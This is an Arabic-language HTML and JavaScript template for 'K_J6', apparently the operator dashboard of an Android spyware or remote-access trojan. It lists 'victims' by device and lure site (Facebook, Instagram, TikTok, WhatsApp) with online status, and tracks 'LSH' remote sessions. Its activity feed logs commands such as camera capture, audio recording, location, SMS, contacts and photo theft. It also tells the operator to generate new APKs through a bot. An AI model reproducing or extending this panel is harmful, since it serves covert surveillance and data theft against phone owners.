<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم — K_J6</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
<style>
:root {
  --bg-primary: #05070d;
  --bg-secondary: #0a0f1a;
  --card: #101623;
  --card-hover: #151d2e;
  --border: #1e2836;
  --border-hover: #2d3b52;
  --primary: #00d4ff;
  --primary-glow: rgba(0, 212, 255, 0.4);
  --secondary: #7c3aed;
  --success: #10b981;
  --danger: #ef4444;
  --warning: #f59e0b;
  --text: #e6edf7;
  --text-muted: #6b7a94;
  --gradient-1: linear-gradient(135deg, #00d4ff 0%, #7c3aed 100%);
  --gradient-2: linear-gradient(135deg, #10b981 0%, #059669 100%);
  --gradient-3: linear-gradient(135deg, #f59e0b 0%, #dc2626 100%);
  --gradient-4: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body {
  background: var(--bg-primary);
  color: var(--text);
  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
  min-height: 100vh;
  overflow-x: hidden;
}
body::before {
  content: '';
  position: fixed;
  inset: 0;
  background:
    radial-gradient(circle at 20% 20%, rgba(0, 212, 255, 0.08) 0%, transparent 50%),
    radial-gradient(circle at 80% 80%, rgba(124, 58, 237, 0.08) 0%, transparent 50%),
    radial-gradient(circle at 50% 50%, rgba(139, 92, 246, 0.05) 0%, transparent 70%);
  pointer-events: none;
  z-index: 0;
}
body::after {
  content: '';
  position: fixed;
  inset: 0;
  background-image:
    linear-gradient(rgba(0, 212, 255, 0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0, 212, 255, 0.03) 1px, transparent 1px);
  background-size: 50px 50px;
  pointer-events: none;
  z-index: 0;
  mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
}
.container-main {
  position: relative;
  z-index: 1;
  max-width: 1440px;
  margin: 0 auto;
  padding: 20px;
}

/* ══════════════════════════════════════════════ */
/* NAVBAR */
/* ══════════════════════════════════════════════ */
.navbar-custom {
  background: rgba(10, 15, 26, 0.85);
  backdrop-filter: blur(20px);
  -webkit-backdrop-filter: blur(20px);
  border: 1px solid var(--border);
  border-radius: 16px;
  padding: 14px 22px;
  margin-bottom: 24px;
  position: sticky;
  top: 12px;
  z-index: 100;
  display: flex;
  justify-content: space-between;
  align-items: center;
  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
}
.brand {
  display: flex;
  align-items: center;
  gap: 12px;
  font-weight: 800;
  font-size: 18px;
  background: var(--gradient-1);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  text-decoration: none;
  letter-spacing: -0.5px;
}
.brand-icon {
  width: 40px; height: 40px;
  border-radius: 12px;
  background: var(--gradient-1);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  box-shadow: 0 0 20px var(--primary-glow);
  animation: pulse-glow 3s ease-in-out infinite;
}
@keyframes pulse-glow {
  0%, 100% { box-shadow: 0 0 20px var(--primary-glow); }
  50% { box-shadow: 0 0 30px var(--primary-glow), 0 0 40px var(--primary-glow); }
}
.user-info {
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 13px;
  color: var(--text-muted);
}
.user-badge {
  padding: 8px 14px;
  background: rgba(0, 212, 255, 0.08);
  border: 1px solid rgba(0, 212, 255, 0.2);
  border-radius: 10px;
  color: var(--primary);
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 8px;
}
.btn-logout {
  padding: 8px 14px;
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid rgba(239, 68, 68, 0.3);
  border-radius: 10px;
  color: #fca5a5;
  text-decoration: none;
  font-weight: 600;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  gap: 6px;
}
.btn-logout:hover {
  background: rgba(239, 68, 68, 0.2);
  color: #ef4444;
  transform: translateY(-1px);
}

/* ══════════════════════════════════════════════ */
/* STATS CARDS */
/* ══════════════════════════════════════════════ */
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 16px;
  margin-bottom: 24px;
}
.stat-card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 18px;
  padding: 22px;
  position: relative;
  overflow: hidden;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  cursor: default;
}
.stat-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 3px;
  background: var(--gradient-1);
  opacity: 0;
  transition: opacity 0.3s;
}
.stat-card:hover {
  border-color: var(--border-hover);
  transform: translateY(-4px);
  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
}
.stat-card:hover::before {
  opacity: 1;
}
.stat-card.blue::before { background: var(--gradient-1); }
.stat-card.green::before { background: var(--gradient-2); }
.stat-card.orange::before { background: var(--gradient-3); }
.stat-card.purple::before { background: var(--gradient-4); }
.stat-icon {
  width: 48px; height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 22px;
  margin-bottom: 14px;
}
.stat-card.blue .stat-icon { background: rgba(0, 212, 255, 0.1); color: var(--primary); }
.stat-card.green .stat-icon { background: rgba(16, 185, 129, 0.1); color: var(--success); }
.stat-card.orange .stat-icon { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
.stat-card.purple .stat-icon { background: rgba(139, 92, 246, 0.1); color: #a78bfa; }
.stat-label {
  font-size: 12px;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 1px;
  font-weight: 600;
  margin-bottom: 8px;
}
.stat-value {
  font-size: 32px;
  font-weight: 800;
  letter-spacing: -1px;
  background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}
.stat-change {
  font-size: 12px;
  color: var(--success);
  margin-top: 6px;
  display: flex;
  align-items: center;
  gap: 4px;
}

/* ══════════════════════════════════════════════ */
/* TABS */
/* ══════════════════════════════════════════════ */
.tabs-container {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 16px;
  padding: 6px;
  display: inline-flex;
  gap: 4px;
  margin-bottom: 24px;
}
.tab-btn {
  padding: 10px 20px;
  background: transparent;
  border: none;
  border-radius: 12px;
  color: var(--text-muted);
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: inherit;
}
.tab-btn:hover {
  color: var(--text);
  background: rgba(0, 212, 255, 0.05);
}
.tab-btn.active {
  background: var(--gradient-1);
  color: white;
  box-shadow: 0 4px 16px rgba(0, 212, 255, 0.3);
}

/* ══════════════════════════════════════════════ */
/* CONTENT */
/* ══════════════════════════════════════════════ */
.content-section {
  animation: fadeIn 0.3s ease-out;
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(8px); }
  to { opacity: 1; transform: translateY(0); }
}

.filter-bar {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 14px;
  padding: 14px;
  margin-bottom: 16px;
  display: flex;
  gap: 12px;
  flex-wrap: wrap;
}
.search-input {
  flex: 1;
  min-width: 200px;
  padding: 12px 16px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 10px;
  color: var(--text);
  font-family: inherit;
  font-size: 14px;
  transition: all 0.2s;
}
.search-input:focus {
  outline: none;
  border-color: var(--primary);
  box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
}
.search-input::placeholder { color: var(--text-muted); }
.filter-select {
  padding: 12px 16px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-radius: 10px;
  color: var(--text);
  font-family: inherit;
  font-size: 14px;
  cursor: pointer;
  min-width: 140px;
}
.filter-select:focus {
  outline: none;
  border-color: var(--primary);
}
.btn-refresh {
  padding: 12px 20px;
  background: var(--gradient-1);
  border: none;
  border-radius: 10px;
  color: white;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: inherit;
  font-size: 14px;
}
.btn-refresh:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 24px rgba(0, 212, 255, 0.4);
}
.btn-refresh:active { transform: translateY(0); }

/* ══════════════════════════════════════════════ */
/* VICTIM CARDS */
/* ══════════════════════════════════════════════ */
.victims-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 14px;
}
.victim-card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 16px;
  padding: 18px;
  text-decoration: none;
  color: var(--text);
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  position: relative;
  overflow: hidden;
  display: block;
}
.victim-card::before {
  content: '';
  position: absolute;
  top: 0;
  right: 0;
  width: 4px;
  height: 100%;
  background: var(--border);
  transition: background 0.3s;
}
.victim-card:hover {
  border-color: var(--border-hover);
  background: var(--card-hover);
  transform: translateY(-3px);
  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
  color: var(--text);
}
.victim-card.online::before { background: var(--success); }
.victim-card.idle::before { background: var(--warning); }
.victim-card.offline::before { background: #475569; }

.victim-header-row {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 12px;
  margin-bottom: 12px;
}
.victim-avatar {
  width: 44px;
  height: 44px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 22px;
  background: rgba(0, 212, 255, 0.1);
  flex-shrink: 0;
  position: relative;
}
.victim-avatar.online::after {
  content: '';
  position: absolute;
  bottom: -2px;
  right: -2px;
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background: var(--success);
  border: 2px solid var(--card);
  box-shadow: 0 0 10px var(--success);
  animation: pulse-dot 2s infinite;
}
@keyframes pulse-dot {
  0%, 100% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.2); opacity: 0.7; }
}
.victim-info { flex: 1; min-width: 0; }
.victim-name {
  font-size: 15px;
  font-weight: 700;
  margin-bottom: 4px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  color: var(--text);
}
.victim-meta {
  font-size: 12px;
  color: var(--text-muted);
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}
.victim-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-top: 12px;
  border-top: 1px solid var(--border);
  margin-top: 12px;
}
.victim-time {
  font-size: 11px;
  color: var(--text-muted);
  display: flex;
  align-items: center;
  gap: 4px;
}
.status-badge {
  padding: 4px 10px;
  border-radius: 8px;
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.status-badge.online {
  background: rgba(16, 185, 129, 0.15);
  color: #34d399;
  border: 1px solid rgba(16, 185, 129, 0.3);
}
.status-badge.idle {
  background: rgba(245, 158, 11, 0.15);
  color: #fbbf24;
  border: 1px solid rgba(245, 158, 11, 0.3);
}
.status-badge.offline {
  background: rgba(71, 85, 105, 0.3);
  color: #94a3b8;
  border: 1px solid rgba(71, 85, 105, 0.5);
}

/* ══════════════════════════════════════════════ */
/* EMPTY STATE */
/* ══════════════════════════════════════════════ */
.empty-state {
  text-align: center;
  padding: 80px 20px;
  color: var(--text-muted);
}
.empty-state-icon {
  font-size: 64px;
  opacity: 0.3;
  margin-bottom: 20px;
  display: block;
}
.empty-state h3 {
  font-size: 18px;
  color: var(--text);
  margin-bottom: 8px;
  font-weight: 700;
}
.empty-state p {
  font-size: 14px;
  margin-bottom: 16px;
}

/* ══════════════════════════════════════════════ */
/* ACTIVITY */
/* ══════════════════════════════════════════════ */
.activity-card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 16px;
  padding: 20px;
}
.activity-title {
  font-size: 16px;
  font-weight: 700;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 8px;
  padding-bottom: 14px;
  border-bottom: 1px solid var(--border);
}
.activity-item {
  padding: 14px 0;
  border-bottom: 1px solid var(--border);
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 12px;
  font-size: 14px;
}
.activity-item:last-child { border-bottom: none; }
.activity-time {
  font-size: 12px;
  color: var(--text-muted);
  white-space: nowrap;
}

/* ══════════════════════════════════════════════ */
/* LOADER */
/* ══════════════════════════════════════════════ */
.spinner {
  display: inline-block;
  width: 20px;
  height: 20px;
  border: 2px solid rgba(0, 212, 255, 0.15);
  border-top-color: var(--primary);
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

@media (max-width: 640px) {
  .container-main { padding: 12px; }
  .navbar-custom { padding: 12px 16px; }
  .brand { font-size: 16px; }
  .stat-value { font-size: 26px; }
  .tabs-container { width: 100%; justify-content: center; }
  .tab-btn { padding: 8px 14px; font-size: 13px; }
  .filter-bar { flex-direction: column; }
  .search-input, .filter-select, .btn-refresh { width: 100%; }
}
</style>
</head>
<body>

<div class="container-main">

  <!-- ═══ NAVBAR ═══ -->
  <nav class="navbar-custom">
    <a class="brand" href="/dashboard/">
      <div class="brand-icon">🛡️</div>
      <span>K_J6 Dashboard</span>
    </a>
    <div class="user-info">
      <div class="user-badge">
        <i class="bi bi-person-circle"></i>
        {{ chat_id }}
      </div>
      <a href="/dashboard/logout" class="btn-logout">
        <i class="bi bi-box-arrow-left"></i>
        <span class="d-none d-md-inline">خروج</span>
      </a>
    </div>
  </nav>

  <!-- ═══ STATS ═══ -->
  <div class="stats-grid">
    <div class="stat-card blue">
      <div class="stat-icon"><i class="bi bi-people-fill"></i></div>
      <div class="stat-label">إجمالي الضحايا</div>
      <div class="stat-value" id="stat-total">—</div>
    </div>
    <div class="stat-card green">
      <div class="stat-icon"><i class="bi bi-wifi"></i></div>
      <div class="stat-label">متصلين الآن</div>
      <div class="stat-value" id="stat-online">—</div>
      <div class="stat-change">
        <i class="bi bi-arrow-up"></i> مباشر
      </div>
    </div>
    <div class="stat-card orange">
      <div class="stat-icon"><i class="bi bi-lightning-charge-fill"></i></div>
      <div class="stat-label">أوامر اليوم</div>
      <div class="stat-value" id="stat-commands">—</div>
    </div>
    <div class="stat-card purple">
      <div class="stat-icon"><i class="bi bi-broadcast"></i></div>
      <div class="stat-label">جلسات LSH</div>
      <div class="stat-value" id="stat-lsh">—</div>
    </div>
  </div>

  <!-- ═══ TABS ═══ -->
  <div class="tabs-container">
    <button class="tab-btn active" data-tab="victims">
      <i class="bi bi-phone-fill"></i> الضحايا
    </button>
    <button class="tab-btn" data-tab="lsh">
      <i class="bi bi-broadcast"></i> LSH
    </button>
    <button class="tab-btn" data-tab="activity">
      <i class="bi bi-activity"></i> النشاط
    </button>
  </div>

  <!-- ═══ TAB: VICTIMS ═══ -->
  <div id="tab-victims" class="content-section">
    <div class="filter-bar">
      <input type="text" id="victim-search" class="search-input" 
             placeholder="🔍 ابحث بالاسم أو الموديل...">
      <select id="victim-filter" class="filter-select">
        <option value="all">الحالة: الكل</option>
        <option value="online">🟢 متصل</option>
        <option value="idle">🟡 خامل</option>
        <option value="offline">⚫ غير متصل</option>
      </select>
      <button class="btn-refresh" onclick="loadVictims()">
        <i class="bi bi-arrow-clockwise"></i> تحديث
      </button>
    </div>
    <div id="victims-list" class="victims-grid">
      <div class="empty-state" style="grid-column: 1/-1;">
        <span class="spinner" style="width:32px;height:32px;border-width:3px;"></span>
        <p class="mt-3">جاري التحميل...</p>
      </div>
    </div>
  </div>

  <!-- ═══ TAB: LSH ═══ -->
  <div id="tab-lsh" class="content-section" style="display:none">
    <div id="lsh-list" class="victims-grid">
      <div class="empty-state" style="grid-column: 1/-1;">
        <span class="spinner" style="width:32px;height:32px;border-width:3px;"></span>
      </div>
    </div>
  </div>

  <!-- ═══ TAB: ACTIVITY ═══ -->
  <div id="tab-activity" class="content-section" style="display:none">
    <div class="activity-card">
      <div class="activity-title">
        <i class="bi bi-clock-history" style="color:var(--primary);"></i>
        <span>آخر الأحداث</span>
      </div>
      <div id="activity-feed">
        <div class="empty-state">
          <span class="spinner"></span>
        </div>
      </div>
    </div>
  </div>

</div>

<script>
// ═══════════════════════════════════════════════════
// Utils
// ═══════════════════════════════════════════════════
function escapeHtml(s) {
  if (!s) return '';
  return String(s).replace(/[&<>"']/g, c => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  })[c]);
}

function timeAgo(ts) {
  if (!ts) return 'لم يتصل بعد';
  const diff = Date.now()/1000 - parseFloat(ts);
  if (diff < 60) return `قبل ${Math.floor(diff)}ث`;
  if (diff < 3600) return `قبل ${Math.floor(diff/60)}د`;
  if (diff < 86400) return `قبل ${Math.floor(diff/3600)}س`;
  return `قبل ${Math.floor(diff/86400)}ي`;
}

function getStatus(lastSeen) {
  if (!lastSeen) return 'offline';
  const diff = Date.now()/1000 - parseFloat(lastSeen);
  if (diff < 60) return 'online';
  if (diff < 3600) return 'idle';
  return 'offline';
}

// ═══════════════════════════════════════════════════
// Stats
// ═══════════════════════════════════════════════════
async function loadStats() {
  try {
    const r = await fetch('/dashboard/api/stats');
    const d = await r.json();
    document.getElementById('stat-total').textContent = d.total || 0;
    document.getElementById('stat-online').textContent = d.online || 0;
    document.getElementById('stat-commands').textContent = d.commands_today || 0;
    document.getElementById('stat-lsh').textContent = d.lsh_sessions || 0;
  } catch(e) {
    console.error('stats error:', e);
  }
}

// ═══════════════════════════════════════════════════
// Victims
// ═══════════════════════════════════════════════════
let allVictims = [];

async function loadVictims() {
  try {
    const r = await fetch('/dashboard/api/victims');
    allVictims = await r.json();
    renderVictims();
  } catch(e) {
    document.getElementById('victims-list').innerHTML = `
      <div class="empty-state" style="grid-column: 1/-1;">
        <span class="empty-state-icon">⚠️</span>
        <h3>فشل التحميل</h3>
      </div>`;
  }
}

function renderVictims() {
  const container = document.getElementById('victims-list');
  const search = document.getElementById('victim-search').value.toLowerCase();
  const filter = document.getElementById('victim-filter').value;

  let filtered = allVictims.filter(v => {
    const status = getStatus(v.last_seen);
    if (filter !== 'all' && status !== filter) return false;
    if (search) {
      const haystack = `${v.name || ''} ${v.model || ''} ${v.brand || ''}`.toLowerCase();
      if (!haystack.includes(search)) return false;
    }
    return true;
  });

  if (!filtered.length) {
    container.innerHTML = `
      <div class="empty-state" style="grid-column: 1/-1;">
        <span class="empty-state-icon">📭</span>
        <h3>لا يوجد ضحايا</h3>
        <p>استخدم البوت لإنشاء APK جديد</p>
      </div>`;
    return;
  }

  container.innerHTML = filtered.map(v => {
    const status = getStatus(v.last_seen);
    const siteIcon = {
      'facebook': '📘', 'instagram': '📷', 'tiktok': '🎵',
      'whatsapp': '💬', 'general': '📱'
    }[v.site] || '📱';

    const statusLabel = {
      'online': 'متصل',
      'idle': 'خامل',
      'offline': 'غير متصل'
    }[status];

    return `
      <a href="/dashboard/victim/${v.victim_id}" class="victim-card ${status}">
        <div class="victim-header-row">
          <div class="victim-avatar ${status}">${siteIcon}</div>
          <div class="victim-info">
            <div class="victim-name">${escapeHtml(v.name || 'بدون اسم')}</div>
            <div class="victim-meta">
              ${escapeHtml(v.brand || '')} ${escapeHtml(v.model || '')}
            </div>
          </div>
        </div>
        <div class="victim-footer">
          <div class="victim-time">
            <i class="bi bi-clock"></i> ${timeAgo(v.last_seen)}
          </div>
          <span class="status-badge ${status}">${statusLabel}</span>
        </div>
      </a>
    `;
  }).join('');
}

// ═══════════════════════════════════════════════════
// LSH
// ═══════════════════════════════════════════════════
async function loadLSH() {
  const c = document.getElementById('lsh-list');
  c.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><span class="spinner"></span></div>`;

  try {
    const r = await fetch('/dashboard/api/lsh_sessions');
    const sessions = await r.json();

    if (!sessions.length) {
      c.innerHTML = `
        <div class="empty-state" style="grid-column: 1/-1;">
          <span class="empty-state-icon">📡</span>
          <h3>لا يوجد جلسات LSH</h3>
        </div>`;
      return;
    }

    c.innerHTML = sessions.map(s => `
      <a href="/dashboard/lsh/${s.session_id}" class="victim-card ${s.is_active ? 'online' : 'offline'}">
        <div class="victim-header-row">
          <div class="victim-avatar ${s.is_active ? 'online' : ''}">📡</div>
          <div class="victim-info">
            <div class="victim-name">${s.session_id.substring(0, 16)}...</div>
            <div class="victim-meta">
              إعادة اتصال: ${s.reconnect_count} · معلقة: ${s.pending_commands}
            </div>
          </div>
        </div>
        <div class="victim-footer">
          <div class="victim-time"><i class="bi bi-broadcast"></i> Session</div>
          <span class="status-badge ${s.is_active ? 'online' : 'offline'}">
            ${s.is_active ? 'نشط' : 'غير نشط'}
          </span>
        </div>
      </a>
    `).join('');
  } catch(e) {
    c.innerHTML = '<div class="empty-state" style="grid-column:1/-1;"><h3>فشل التحميل</h3></div>';
  }
}

// ═══════════════════════════════════════════════════
// Activity
// ═══════════════════════════════════════════════════
async function loadActivity() {
  const c = document.getElementById('activity-feed');
  try {
    const r = await fetch('/dashboard/api/activity');
    const events = await r.json();

    if (!events.length) {
      c.innerHTML = `
        <div class="empty-state">
          <span class="empty-state-icon">📭</span>
          <h3>لا يوجد نشاط بعد</h3>
        </div>`;
      return;
    }

    const actionLabels = {
      'camera_front': '📷 كاميرا أمامية',
      'camera_back': '📸 كاميرا خلفية',
      'record_audio': '🎙️ تسجيل صوتي',
      'get_location': '📍 موقع',
      'get_sms': '📨 رسائل SMS',
      'get_contacts': '👥 جهات اتصال',
      'get_photos': '🖼️ صور',
      'get_apps': '📲 تطبيقات',
      'get_device_info': '📱 معلومات الجهاز',
    };

    c.innerHTML = events.map(e => {
      let text = '';
      if (e.type === 'command') {
        const icon = actionLabels[e.action] || `⚡ ${e.action}`;
        text = `${icon} — <code>${e.victim_id ? e.victim_id.substring(0,8) : ''}</code>`;
      } else {
        text = e.text || e.type;
      }
      return `
        <div class="activity-item">
          <div>${text}</div>
          <div class="activity-time">${e.time_str || ''}</div>
        </div>
      `;
    }).join('');
  } catch(e) {
    c.innerHTML = '<div class="empty-state"><h3>فشل التحميل</h3></div>';
  }
}

// ═══════════════════════════════════════════════════
// Tabs
// ═══════════════════════════════════════════════════
document.querySelectorAll('.tab-btn').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
    el.classList.add('active');
    document.querySelectorAll('.content-section').forEach(x => x.style.display = 'none');
    const target = document.getElementById('tab-' + el.dataset.tab);
    if (target) target.style.display = 'block';
    if (el.dataset.tab === 'activity') loadActivity();
    if (el.dataset.tab === 'lsh') loadLSH();
  });
});

// ═══════════════════════════════════════════════════
// Filters
// ═══════════════════════════════════════════════════
document.getElementById('victim-search').addEventListener('input', renderVictims);
document.getElementById('victim-filter').addEventListener('change', renderVictims);

// ═══════════════════════════════════════════════════
// Auto Refresh
// ═══════════════════════════════════════════════════
loadStats();
loadVictims();
setInterval(loadStats, 10000);
setInterval(loadVictims, 15000);
</script>

</body>
</html>
